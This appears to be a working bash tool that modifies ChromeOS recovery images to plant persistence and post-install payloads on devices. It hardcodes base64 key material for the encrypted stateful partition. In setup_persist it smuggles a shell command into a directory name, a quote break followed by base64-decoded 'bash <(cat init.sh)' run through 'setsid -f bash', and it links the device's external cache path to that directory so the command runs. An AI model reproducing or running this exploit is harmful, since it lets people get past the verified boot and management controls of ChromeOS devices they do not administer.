cleanup() {
	if [ -d "$MNT_ENCSTATEFUL" ]; then
		umount "$MNT_ENCSTATEFUL" && rmdir "$MNT_ENCSTATEFUL"
		cryptsetup close "$ENCSTATEFUL_NAME" || :
	fi
	[ -d "$MNT_STATE" ] && umount "$MNT_STATE" && rmdir "$MNT_STATE"
	[ -d "$MNT_ROOT" ] && umount "$MNT_ROOT" && rmdir "$MNT_ROOT"
	if [ -n "$VG_NAME" ]; then
		lvm vgchange -an "$VG_NAME" || :
		lvm vgmknodes || :
	fi
	[ -z "$LOOPDEV2" ] || losetup -d "$LOOPDEV2" || :
	[ -z "$LOOPDEV" ] || losetup -d "$LOOPDEV" || :
	rm -f "${TEMPFILES[@]}"
	trap - EXIT INT
}

fancy_bool() {
	if [ $1 -ge 1 ]; then
		echo "yes"
	else
		echo "no"
	fi
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

key_wrapped() {
	cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
}

key_cs() {
	cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
}

# TOTALLY not stolen from chromeos-install
fast_dd() {
  # Usage: fast_dd <count> <seek> <skip> other dd args
  # Note: <count> and <seek> are in units of SRC_BLKSIZE, while <skip> is in
  # units of DST_BLKSIZE.
  local user_count="$1"
  local user_seek="$2"
  local user_skip="$3"
  local chunk_num="$4"
  local total_chunks="$5"
  shift 5
  # Provide some simple progress updates to the user.
  set -- "$@" status=progress
  # Find the largest block size that all the parameters are a factor of.
  local block_size=$((2 * 1024 * 1024))
  while [ $(((user_count * SRC_BLKSIZE) % block_size)) -ne 0 ] || \
         [ $(((user_skip * SRC_BLKSIZE) % block_size)) -ne 0 ] || \
         [ $(((user_seek * DST_BLKSIZE) % block_size)) -ne 0 ]; do

    : $((block_size /= 2))
  done

  # Print a humble info line if the block size is not super, and complain more
  # loudly if it's really small (and the partition is big).
  if [ "${block_size}" -ne $((2 * 1024 * 1024)) ]; then
    echo "DD with block size ${block_size}"
    if [ "${block_size}" -lt $((128 * 1024)) ] && \
        [ $((user_count * SRC_BLKSIZE)) -gt $((128 * 1024 * 1024)) ]; then
      echo
      echo "WARNING: DOING A SLOW MISALIGNED dd OPERATION. PLEASE FIX"
      echo "count=${user_count} seek=${user_seek} skip=${user_skip}"
      echo "SRC_BLKSIZE=${SRC_BLKSIZE} DST_BLKSIZE=${DST_BLKSIZE}"
      echo
    fi
  fi

  # Convert the block counts in their respective sizes into the common block
  # size, and blast off.
  local count_common=$((user_count * SRC_BLKSIZE / block_size))
  local seek_common=$((user_seek * DST_BLKSIZE / block_size))
  local skip_common=$((user_skip * SRC_BLKSIZE / block_size))

  if [ "${total_chunks}" -ne 1 ]; then
    # Divide the count by the number of chunks, rounding up.  This is the
    # chunk size.
    local chunk_size=$(((count_common + total_chunks - 1) / total_chunks))

    : $(( seek_common += chunk_size * (chunk_num - 1) ))
    : $(( skip_common += chunk_size * (chunk_num - 1) ))

    if [ "${chunk_num}" -ne "${total_chunks}" ]; then
      count_common="${chunk_size}"
    else
      : $(( count_common -= chunk_size * (chunk_num - 1) ))
    fi
  fi

  dd "$@" bs="${block_size}" seek="${seek_common}" skip="${skip_common}" \
      "count=${count_common}"
}

detect_image_features() {
	local version_line chunks_line rootfs_line modules_path
	MNT_ROOT=$(mktemp -d)
	mount -o ro "$1" "$MNT_ROOT"

	IMAGE_VERSION=
	if [ -f "$MNT_ROOT/etc/lsb-release" ]; then
		if version_line="$(grep -m 1 "^CHROMEOS_RELEASE_CHROME_MILESTONE=[0-9]" "$MNT_ROOT/etc/lsb-release")"; then
			IMAGE_VERSION=$(echo "$version_line" | grep -o "[0-9]*")
		fi
	else
		fail "Could not find /etc/lsb-release"
	fi
	if [ -z "$IMAGE_VERSION" ]; then
		fail "Could not find image version."
	fi
	log_info "Detected version: $IMAGE_VERSION"
	if [ $IMAGE_VERSION -gt 124 ]; then
		fail "Image version is too new. Please use an image for r124 or older."
	fi

	TARGET_ARCH=x86
	if [ -f "$MNT_ROOT/bin/bash" ]; then
		case "$(file -b "$MNT_ROOT/bin/bash" | awk -F ', ' '{print $2}' | tr '[:upper:]' '[:lower:]')" in
			*aarch64* | *armv8* | *arm*) TARGET_ARCH=arm ;;
		esac
	fi
	log_info "Detected architecture: $TARGET_ARCH"

	CHUNKS=1
	LVM_STATEFUL=0
	if [ -f "$MNT_ROOT/usr/sbin/chromeos-install" ]; then
		if chunks_line="$(grep -m 1 "^NUM_ROOTFS_CHUNKS=[0-9]" "$MNT_ROOT/usr/sbin/chromeos-install")"; then
			CHUNKS=$(echo "$chunks_line" | grep -o "[0-9]*")
		fi
		grep -q '^DEFINE_boolean lvm_stateful "${FLAGS_TRUE}"' "$MNT_ROOT/usr/sbin/chromeos-install" && LVM_STATEFUL=1
	else
		fail "Could not find /usr/sbin/chromeos-install"
	fi
	log_info "Detected chunks: $CHUNKS"
	if [ $IMAGE_VERSION -lt 86 ] && [ $CHUNKS -ne 1 ]; then
		fail "Unexpected chunk count (expected 1)"
	elif [ $IMAGE_VERSION -ge 86 ] && [ $CHUNKS -ne 4 ]; then
		fail "Unexpected chunk count (expected 4)"
	fi
	log_info "Detected LVM stateful: $(fancy_bool $LVM_STATEFUL)"

	ROOTA_BASE_SIZE=$((1024 * 1024 * 1024 * 4))
	LAYOUTV3=0
	if [ -f "$MNT_ROOT/usr/sbin/write_gpt.sh" ]; then
		if rootfs_line="$(grep -m 1 "^ROOTFS_PARTITION_SIZE=[0-9]" "$MNT_ROOT/usr/sbin/write_gpt.sh")"; then
			ROOTA_BASE_SIZE=$(echo "$rootfs_line" | grep -o "[0-9]*")
		fi
		grep -q "MINIOS" "$MNT_ROOT/usr/sbin/write_gpt.sh" && LAYOUTV3=1
	else
		fail "Could not find /usr/sbin/write_gpt.sh"
	fi
	log_info "Detected ROOT-A size: $(format_bytes $ROOTA_BASE_SIZE)"
	log_info "Detected layout v3: $(fancy_bool $LAYOUTV3)"

	KERNEL_VERSION=
	SUPPORTS_BIG_DATE=0
	modules_path=$(echo "$MNT_ROOT/lib/modules"/* | head -n 1)
	if [ -d "$modules_path" ]; then
		KERNEL_VERSION=$(basename "$modules_path" | grep -oE "^[0-9]+\.[0-9]+") || :
	fi
	if [ -z "$KERNEL_VERSION" ]; then
		log_warn "Could not find kernel version. Will assume no big date support"
	else
		log_info "Detected kernel version: $KERNEL_VERSION"
		check_semver_ge "$KERNEL_VERSION" 4 4 && SUPPORTS_BIG_DATE=1
	fi
	log_info "Detected big date support: $(fancy_bool $SUPPORTS_BIG_DATE)"

	umount "$MNT_ROOT"
	rmdir "$MNT_ROOT"
}

determine_internal_disk() {
	local selected
	if [ -n "$FLAGS_internal_disk" ]; then
		INTERNAL_DISK="$FLAGS_internal_disk"
	elif [ $YES -eq 1 ]; then
		INTERNAL_DISK=mmcblk0
	else
		echo "Choose your internal disk type and press enter:"
		echo "1) mmcblk0 (eMMC)"
		echo "2) mmcblk1 (eMMC)"
		echo "3) nvme0n1 (NVMe)"
		echo "4) sda (other SSD)"
		echo "5) sdb (other SSD)"
		echo "6) hda (HDD)"
		while :; do
			read -re selected
			case "$selected" in
				1) INTERNAL_DISK=mmcblk0 ; break ;;
				2) INTERNAL_DISK=mmcblk1 ; break ;;
				3) INTERNAL_DISK=nvme0n1 ; break ;;
				4) INTERNAL_DISK=sda ; break ;;
				5) INTERNAL_DISK=sdb ; break ;;
				6) INTERNAL_DISK=hda ; break ;;
				*) echo "Invalid input, try again" ;;
			esac
		done
	fi
	log_info "Internal disk: $INTERNAL_DISK"
}

confirm_fourths_mode() {
	local estimated_size selected
	estimated_size=$(((ROOTA_BASE_SIZE + OVERFLOW_SIZE) * CHUNKS))
	log_warn "You have selected basic/persist when postinst is available, image size will be very large (about $(format_bytes $estimated_size))"
	if [ $YES -eq 0 ]; then
		echo "Do you want to continue? (y/N)"
		read -re selected
		case "$selected" in
			[yY]) : ;;
			*) fail "Aborting..." ;;
		esac
	fi
}

determine_type() {
	local enabled_var
	log_info "Supports postinst: $(fancy_bool $ENABLE_POSTINST)"
	log_info "Supports postinst_sym: $(fancy_bool $ENABLE_POSTINST_SYM)"
	log_info "Supports persist: $(fancy_bool $ENABLE_PERSIST)"
	log_info "Supports basic: $(fancy_bool $ENABLE_BASIC)"
	log_info "Supports unverified: $(fancy_bool $ENABLE_UNVERIFIED)"

	if [ -n "$FLAGS_type" ]; then
		enabled_var="ENABLE_$(echo "$FLAGS_type" | tr '[:lower:]' '[:upper:]')"
		if [ "${!enabled_var}" -eq 1 ]; then
			TYPE="$FLAGS_type"
		else
			fail "'$FLAGS_type' is not supported by this image."
		fi
	elif [ $ENABLE_UNVERIFIED -eq 1 ] && [ $IMAGE_VERSION -le 41 ]; then
		TYPE=unverified
	elif [ $ENABLE_POSTINST -eq 1 ]; then
		TYPE=postinst
	elif [ $ENABLE_POSTINST_SYM -eq 1 ] && [ $SUPPORTS_BIG_DATE -eq 1 ]; then
		TYPE=postinst_sym
	elif [ $ENABLE_PERSIST -eq 1 ]; then
		TYPE=persist
	elif [ $ENABLE_BASIC -eq 1 ]; then
		TYPE=basic
	else
		fail "Nothing supported by this image :("
	fi
}

mkpayload() {
	local name file
	if [ $PAYLOAD_ONLY -eq 1 ]; then
		name="${1:-payload}"
		file=$(mktemp "$name.XXXXX.bin")
		log_info "Creating $name at $file" >&2
		chown "$USER:$USER" "$file"
		echo "$file"
	else
		mktemp
	fi
}

mkfs() {
	mkfs.ext4 -F -b 4096 -O ^metadata_csum,uninit_bg "$@"
}

setup_roota() {
	local src_dir
	src_dir="$SCRIPT_DIR"/postinst
	[ -d "$src_dir" ] || fail "Could not find postinst payload '$src_dir'"
	suppress mkfs "$1"
	MNT_ROOT=$(mktemp -d)
	mount -o loop "$1" "$MNT_ROOT"

	cp -R "$src_dir"/* "$MNT_ROOT"
	chmod +x "$MNT_ROOT"/postinst

	umount "$MNT_ROOT"
	rmdir "$MNT_ROOT"
}

setup_persist() {
	local src_dir cmd_dir
	src_dir="$SCRIPT_DIR"/persist
	[ -d "$src_dir" ] || fail "Could not find persistence payload '$src_dir'"
	mkdir -p "$MNT_ENCSTATEFUL"/var/lib/whitelist/persist "$MNT_ENCSTATEFUL"/var/cache "$MNT_STATE"/unencrypted/import_extensions
	cp -R "$src_dir"/* "$MNT_ENCSTATEFUL"/var/lib/whitelist/persist
	cmd_dir="---persist---';echo $(echo 'bash <(cat /var/lib/whitelist/persist/init.sh)'|base64 -w0)|base64 -d|setsid -f bash;echo '"
	mkdir "$MNT_ENCSTATEFUL/var/lib/whitelist/$cmd_dir"
	ln -s "/var/lib/whitelist/$cmd_dir" "$MNT_ENCSTATEFUL"/var/cache/external_cache
}

find_unallocated_sectors() {
	local allgaps gapstart gapsize difference
	if allgaps=$("$SFDISK" -F "$1" | grep "^\s*[0-9]"); then
		while read gap; do
			gapstart=$(echo "$gap" | awk '{print $1}')
			gapsize=$(echo "$gap" | awk '{print $3}')
			difference=$((gapstart - $3))
			if [ "$difference" -lt 0 ]; then
				: $((gapstart -= difference))
				: $((gapsize -= difference))
			fi
			if [ "$(echo "$gap" | awk '{print $2}')" -ge "$gapstart" ] && [ "$gapsize" -ge "$2" ]; then
				echo "$gapstart"
				return
			fi
		done <<<"$allgaps"
	fi
	return 1
}

move_blocking_partitions() {
	local part_table part_starts physical_part_table needs_move move_sizes total_move_size started this_num this_start this_size new_end gapstart
	part_table=$("$CGPT" show -q "$1")
	part_starts=$(echo "$part_table" | awk '{print $1}' | sort -n)
	physical_part_table=()
	for part in $part_starts; do
		physical_part_table+=("$(echo "$part_table" | grep "^\s*${part}\s")")
	done

	needs_move=()
	move_sizes=()
	total_move_size=0
	started=0
	for i in "${!physical_part_table[@]}"; do
		this_num=$(echo "${physical_part_table[$i]}" | awk '{print $3}')
		if [ $this_num -eq $2 ]; then
			started=1
		elif [ $started -eq 0 ]; then
			continue
		fi
		this_start=$(echo "${physical_part_table[$i]}" | awk '{print $1}')
		this_size=$(echo "${physical_part_table[$i]}" | awk '{print $2}')
		if [ $this_num -eq $2 ]; then
			new_end=$((this_start + $3))
			continue
		elif [ $this_start -le $new_end ]; then
			needs_move+=($this_num)
			move_sizes+=($this_size)
			: $((total_move_size+=this_size))
		else
			break
		fi
	done

	[ -n "$needs_move" ] || return 0
	log_info "Moving partitions: ${needs_move[@]}"
	log_debug "sizes: ${move_sizes[@]}"
	log_debug "total sectors to move: $total_move_size"

	for i in "${!needs_move[@]}"; do
		gapstart=$(find_unallocated_sectors "$1" "${move_sizes[$i]}" "$new_end") || :
		[ -n "$gapstart" ] || fail "Not enough unpartitioned space in image."
		log_debug "gap start: $gapstart"
		suppress "$SFDISK" -N "${needs_move[$i]}" --move-data "$1" <<<"$gapstart"
	done
}

trap 'echo $BASH_COMMAND failed with exit code $?. THIS IS A BUG, PLEASE REPORT!' ERR
trap 'cleanup; exit' EXIT
trap 'echo Abort.; cleanup; exit' INT

get_flags() {
	load_shflags

	FLAGS_HELP="Usage: $0 -i <path/to/image.bin> [flags]"

	DEFINE_string image "" "Path to recovery image" "i"

	DEFINE_string type "" "Type (postinst, postinst_sym, persist, basic, or unverified)" "t"

	DEFINE_string internal_disk "" "Internal disk for postinst_sym (mmcblk0, mmcblk1, nvme0n1, sda...)"

	DEFINE_boolean yes "$FLAGS_FALSE" "Assume yes for all questions" "y"

	DEFINE_boolean payload_only "$FLAGS_FALSE" "Generate payloads but don't modify image (image not required)" ""

	DEFINE_string encstateful_payload "" "Path to custom encstateful payload (tar)" "p"

	DEFINE_boolean devmode "$FLAGS_FALSE" "Create .developer_mode (persist, basic only)" "e"

	DEFINE_string finalsizefile "" "Write final image size in bytes to this file" ""

	DEFINE_boolean debug "$FLAGS_FALSE" "Print debug messages" "d"

	FLAGS "$@" || exit $?

	IMAGE="$FLAGS_image"
	YES=0
	PAYLOAD_ONLY=0
	if [ "$FLAGS_yes" = "$FLAGS_TRUE" ]; then
		YES=1
	fi
	if [ "$FLAGS_payload_only" = "$FLAGS_TRUE" ]; then
		PAYLOAD_ONLY=1
	fi

	if [ -z "$IMAGE" ] && [ $PAYLOAD_ONLY -eq 0 ]; then
		flags_help || :
		exit 1
	fi
	case "$FLAGS_type" in
		""|postinst|postinst_sym|persist|basic|unverified) : ;;
		*) echo "Invalid type '$FLAGS_type'"; flags_help || :; exit 1 ;;
	esac
	if [ -n "$FLAGS_encstateful_payload" ] && [ "$FLAGS_type" != basic ]; then
		echo "Must specify --type=basic when using --encstateful_payload"
		flags_help || :
		exit 1
	fi
}
